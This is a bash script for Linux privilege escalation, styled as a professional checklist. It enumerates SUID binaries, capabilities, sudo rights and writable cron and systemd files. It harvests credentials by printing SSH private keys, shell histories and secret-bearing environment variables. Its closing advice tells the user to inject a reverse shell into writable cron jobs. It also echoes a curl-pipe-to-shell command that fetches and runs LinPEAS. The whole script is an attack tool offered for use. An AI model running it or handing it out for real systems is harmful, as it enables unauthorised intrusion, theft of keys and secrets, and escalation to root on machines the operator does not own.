#!/bin/bash
echo "======================================================================"
echo "                PROFESSIONAL PRIVILEGE ESCALATION CHECKLIST"
echo "======================================================================"

echo -e "\n\033[1;34m[PHASE 0: ENVIRONMENT DETECTION]\033[0m"
echo "=========================================="

# 0.1 Container Detection
echo -e "\n[0.1] Container/LXC/Docker Detection:"
echo -e "----------------------------------------"
if [ -f /.dockerenv ]; then
    echo "[!] Inside Docker container!"
elif grep -qi docker /proc/1/cgroup 2>/dev/null; then
    echo "[!] Docker container detected via cgroup!"
elif grep -qi lxc /proc/1/cgroup 2>/dev/null; then
    echo "[!] LXC container detected!"
elif [ -f /proc/vz ] && [ ! -f /proc/bc ]; then
    echo "[!] OpenVZ container detected!"
else
    echo "[+] Bare metal or VM detected"
fi

# 0.2 Architecture & OS
echo -e "\n[0.2] System Architecture & OS:"
echo -e "----------------------------------"
echo "Hostname: $(hostname)"
echo "Kernel: $(uname -r)"
echo "Architecture: $(uname -m)"
echo "OS Release:"
cat /etc/os-release 2>/dev/null || cat /etc/issue 2>/dev/null || echo "Not found"
echo "Uptime: $(uptime 2>/dev/null || echo 'N/A')"

# 0.3 Current User Context
echo -e "\n[0.3] Current User Context:"
echo -e "------------------------------"
echo "Current user: $(whoami)"
echo "User ID/Group: $(id)"
echo "Groups: $(id -Gn)"
echo "Home directory: $HOME"
echo "Current directory: $(pwd)"


echo -e "\n\033[1;34m[PHASE 1: QUICK WINS - Check these FIRST!]\033[0m"
echo "========================================================"

# 1.1 Sudo without password (JACKPOT)
echo -e "\n[1.1] Sudo Privileges (NOPASSWD):"
echo -e "------------------------------------"
if command -v sudo >/dev/null 2>&1; then
    echo "[*] Checking sudo -l..."
    sudo -l 2>/dev/null | grep -E "(NOPASSWD|ALL|!root)" || echo "No interesting sudo rights"
else
    echo "[-] sudo not installed"
fi

# 1.2 SUID Binaries - Quick dangerous ones
echo -e "\n[1.2] Dangerous SUID Binaries (Common):"
echo -e "------------------------------------------"
DANGEROUS_SUID="nmap\|vim\|find\|bash\|less\|more\|nano\|cp\|mv\|awk\|man\|python\|perl\|ruby\|php"
find / -type f -perm -4000 2>/dev/null | grep -E "$DANGEROUS_SUID" | head -20
if [ $? -ne 0 ]; then
    echo "[+] No obvious dangerous SUID binaries"
fi

# 1.3 Capabilities with root privileges
echo -e "\n[1.3] Dangerous Capabilities:"
echo -e "-------------------------------"
if command -v getcap >/dev/null 2>&1; then
    DANGER_CAPS="cap_dac_read_search\|cap_setuid\|cap_setgid\|cap_sys_admin\|cap_sys_ptrace"
    getcap -r / 2>/dev/null | grep -E "$DANGER_CAPS" || echo "[+] No dangerous capabilities found"
else
    echo "[-] getcap not available"
fi

# 1.4 Cron jobs writable by current user
echo -e "\n[1.4] Writable Cron Jobs:"
echo -e "---------------------------"
for cron_file in /etc/crontab /etc/cron.d/* /etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/* /etc/cron.weekly/* /var/spool/cron/crontabs/*; do
    if [ -f "$cron_file" ] && [ -w "$cron_file" ]; then
        echo "[!] Writable cron file: $cron_file"
    fi
done 2>/dev/null



echo -e "\n\033[1;34m[PHASE 2: COMPREHENSIVE ENUMERATION]\033[0m"
echo "============================================="

# 2.1 Full SUID/SGID Enumeration
echo -e "\n[2.1] Complete SUID/SGID Scan:"
echo -e "---------------------------------"
echo "[*] Scanning for SUID files (this may take a moment)...(50 lines)"
find / -type f -perm -4000 -ls 2>/dev/null | awk '{print $11}' | head -50
echo ""
echo "[*] Scanning for SGID files... (30 lines)"
find / -type f -perm -2000 -ls 2>/dev/null | awk '{print $11}' | head -30

# 2.2 Sudo Detailed Analysis
echo -e "\n[2.2] Detailed Sudo Analysis:"
echo -e "-------------------------------"
if command -v sudo >/dev/null 2>&1; then
    sudo -l 2>/dev/null
    echo ""
    echo "[*] Checking sudo version for vulnerabilities..."
    sudo --version | head -1
fi

# 2.3 Comprehensive Capability Scan
echo -e "\n[2.3] Full Capability Scan:"
echo -e "----------------------------"
if command -v getcap >/dev/null 2>&1; then
    echo "[*] Scanning for files with capabilities... (30 lines)"
    getcap -r / 2>/dev/null | head -30
fi





echo -e "\n\033[1;34m[PHASE 3: FILE SYSTEM & PERMISSIONS]\033[0m"
echo "================================================"

# 3.1 World-Writable Files & Directories
echo -e "\n[3.1] World-Writable Files (excluding /proc):"
echo -e "------------------------------------------------"
echo "[*] Files: (20 lines)"
find / -type f -perm -o=w ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null | grep -v "/run/" | head -20
echo ""
echo "[*] Directories: (15 lines)"
find / -type d -perm -o=w ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null | grep -v "^/run" | head -15

# 3.2 Files Owned by Current User
echo -e "\n[3.2] Files Owned by $(whoami) in Sensitive Locations: (10 lines)"
echo -e "--------------------------------------------------------"
CURRENT_USER=$(whoami)
SENSITIVE_PATHS="/etc /opt /root /home /usr/local  /var"
for path in $SENSITIVE_PATHS; do
    if [ -d "$path" ]; then
        find "$path" -type f -user "$CURRENT_USER" 2>/dev/null | head -10
    fi
done

# 3.3 Backup and Configuration Files
echo -e "\n[3.3] Backup, Config, and Log Files:"
echo -e "--------------------------------------"
echo "[*] Backup files: (50 lines)"
find / -type f \( -name "*backup*" -o -name "*.bak" -o -name "*.old" -o -name "*.orig" -o -name "*.bkp" -o -name "*.kdbx" \) 2>/dev/null | head -50

echo -e "\n[*] Configuration files with passwords: (20 lines)"
find /etc -type f -exec grep -l "password\|passwd\|PASS\|secret" {} \; 2>/dev/null | head -20

echo -e "\n[*] Recent log files: (10 lines)"
find /var/log -type f -mtime -7 2>/dev/null | head -10



echo -e "\n\033[1;34m[PHASE 4: PROCESSES & SERVICES]\033[0m"
echo "=========================================="

# 4.1 Running Processes
echo -e "\n[4.1] Running Processes Analysis:"
echo -e "-----------------------------------"
echo "[*] Processes running as root:"
ps aux | grep -E "^root" | grep -v "\["

echo -e "\n[*] Processes running by current user:"
ps aux | grep -E "^$CURRENT_USER" 

echo -e "\n[*] Network services running as root:"
netstat -tulpn 2>/dev/null | grep "LISTEN" 

# 4.2 Cron Jobs - Complete Analysis
echo -e "\n[4.2] Complete Cron Analysis:"
echo -e "------------------------------"
echo "[*] System crontab:"
cat /etc/crontab 2>/dev/null || echo "No access to /etc/crontab"
echo ""

echo "[*] Cron directories:"
ls -la /etc/cron.* 2>/dev/null
echo ""

echo "[*] User cron jobs:"
for user in $(ls /var/spool/cron/crontabs/ 2>/dev/null); do
    echo "--- $user ---"
    cat "/var/spool/cron/crontabs/$user" 2>/dev/null
done

# 4.3 Systemd Services
echo -e "\n[4.3] Systemd Services Analysis:"
echo -e "----------------------------------"
if command -v systemctl >/dev/null 2>&1; then
    echo "[*] Writable systemd service files:"
    find /etc/systemd/system /lib/systemd/system -type f -writable 2>/dev/null
fi



echo -e "\n\033[1;34m[PHASE 5: CREDENTIAL HUNTING]\033[0m"
echo "=========================================="

# 5.1 Password Mining
echo -e "\n[5.1] Password Search:"
echo -e "-----------------------"
echo "[*] Checking common credential locations:"
CHECK_FILES="
/etc/passwd
/etc/shadow
/etc/master.passwd
/etc/group
/etc/sudoers
/root/.bash_history
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/*/.bash_history
/home/*/.ssh/id_rsa
/home/*/.ssh/authorized_keys
/var/backups/*
"

for file in $CHECK_FILES; do
    if [ -f "$file" ] && [ -r "$file" ]; then
        echo "[+] Readable: $file"
        if [[ "$file" == *"history" ]] || [[ "$file" == *"ssh"* ]]; then
            head -5 "$file" 2>/dev/null
        fi
    fi
done

# 5.2 Memory and Environment
echo -e "\n[5.2] Environment Variables & Memory:"
echo -e "--------------------------------------"
echo "[*] Environment variables with credentials: (20 lines)"
env | grep -i "pass\|secret\|key\|token\|auth" | head -20

echo -e "\n[*] Process environment: (20 lines)"
ps ewww | grep -E "(pass|secret|key|token)" | head -20



echo -e "\n\033[1;34m[PHASE 6: NETWORK & CONTAINER SPECIFIC]\033[0m"
echo "=================================================="

# 6.1 Network Configuration
echo -e "\n[6.1] Network Configuration:"
echo -e "------------------------------"
echo "[*] IP addresses:"
ip a 2>/dev/null || ifconfig 2>/dev/null || echo "Network tools not available"

echo -e "\n[*] Routing table:"
ip route 2>/dev/null || route -n 2>/dev/null

echo -e "\n[*] ARP table:"
ip neigh 2>/dev/null || arp -a 2>/dev/null

# 6.2 Container Escape Vectors
echo -e "\n[6.2] Container Escape Analysis:"
echo -e "----------------------------------"
if [ -f /.dockerenv ] || grep -qi docker /proc/1/cgroup 2>/dev/null; then
    echo "[*] Checking for Docker socket..."
    ls -la /var/run/docker.sock 2>/dev/null
    echo "[*] Checking for mount information..."
    mount 2>/dev/null | grep -v "^sysfs\|^proc\|^tmpfs"
    echo "[*] Checking for privileged mode..."
    if [ -w /dev ]; then
        echo "[!] Container might be privileged (writable /dev)"
    fi
fi

# 6.3 Kernel Modules
echo -e "\n[6.3] Loaded Kernel Modules:"
echo -e "-----------------------------"
lsmod 2>/dev/null | head -15




echo -e "\n\033[1;34m[PHASE 7: DEVELOPMENT TOOLS]\033[0m"
echo "========================================"

# 7.1 Compilation Tools
echo -e "\n[7.1] Available Compilers:"
echo -e "---------------------------"
echo "[*] Checking for compilers..."
COMPILERS="gcc cc clang python3 python2 perl ruby php go rustc"
for compiler in $COMPILERS; do
    if command -v "$compiler" >/dev/null 2>&1; then
        echo "[+] $compiler available: $(command -v $compiler)"
    fi
done

# 7.2 Shared Libraries
echo -e "\n[7.2] LD_PRELOAD and Library Path:"
echo -e "-----------------------------------"
echo "LD_PRELOAD: $LD_PRELOAD"
echo "LD_LIBRARY_PATH: $LD_LIBRARY_PATH"
echo ""
echo "[*] Checking for writable shared library directories..."
find /lib /lib64 /usr/lib /usr/lib64 -type d -writable 2>/dev/null | head -5





echo -e "\n\033[1;34m[PHASE 8: QUICK EXPLOIT VERIFICATION]\033[0m"
echo "=================================================="

# 8.1 Common Vulnerability Checks
echo -e "\n[8.1] Quick Vulnerability Checks:"
echo -e "-----------------------------------"

# Check for CVE-2021-4034 (PwnKit)
if [ -x "$(command -v pkexec)" ]; then
    echo "[*] pkexec available - checking for PwnKit vulnerability..."
    pkexec --version 2>/dev/null
fi

# Check for CVE-2021-3560 (polkit)
if command -v dbus-send >/dev/null 2>&1; then
    echo "[*] dbus-send available - polkit vulnerability possible"
fi

# Check for wildcard injections
echo -e "\n[8.2] Wildcard Injection Checks:"
echo -e "----------------------------------"
echo "[*] Looking for tar/wildcard usage in scripts..."
find /etc/cron* /var/spool/cron* -type f -exec grep -l "tar \*" {} \; 2>/dev/null






echo -e "\n\033[1;34m[PHASE 9: SUMMARY & NEXT STEPS]\033[0m"
echo "=========================================="

echo -e "\n[*] Critical Findings Summary:"
echo -e "--------------------------------"
echo "1. Container environment: $(if [ -f /.dockerenv ] || grep -qi docker /proc/1/cgroup; then echo 'YES'; else echo 'NO'; fi)"
echo "2. Sudo without password: $(if sudo -l 2>/dev/null | grep -q NOPASSWD; then echo 'YES'; else echo 'NO'; fi)"
echo "3. Dangerous SUID binaries: $(find / -type f -perm -4000 2>/dev/null | grep -E 'nmap|vim|find|bash' | wc -l) found"
echo "4. Writable cron files: $(find /etc/cron* /var/spool/cron* -type f -writable 2>/dev/null 2>/dev/null | wc -l) found"
echo "5. Readable shadow file: $(if [ -r /etc/shadow ]; then echo 'YES'; else echo 'NO'; fi)"
echo "6. Compiler available: $(if command -v gcc >/dev/null || command -v cc >/dev/null; then echo 'YES'; else echo 'NO'; fi)"

echo -e "\n\033[1;32m[*] Recommended Next Steps:\033[0m"
echo "--------------------------------"
echo "1. If container: Check for Docker socket, mount points, kernel modules"
echo "2. If sudo NOPASSWD: Research the binary for escape methods"
echo "3. If SUID binaries: Check GTFO bins (gtfobins.github.io)"
echo "4. If writable cron: Inject reverse shell or create SUID binary"
echo "5. Check kernel version against known exploits"
echo "6. Look for internal services for lateral movement"

echo -e "\n\033[1;33m[*] Auto-Exploit Suggestions:\033[0m"
echo "----------------------------------"
KERNEL=$(uname -r)
echo "Kernel: $KERNEL"
echo "Check for exploits: searchsploit $KERNEL"
echo "Or visit: https://www.exploit-db.com/search?q=$KERNEL"

echo -e "\n\033[1;33m[*] Run Linpeas if you failed:\033[0m"
echo "----------------------------------"
echo "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"


echo -e "\n======================================================================"
echo "Scan completed at: $(date)"
echo "======================================================================"







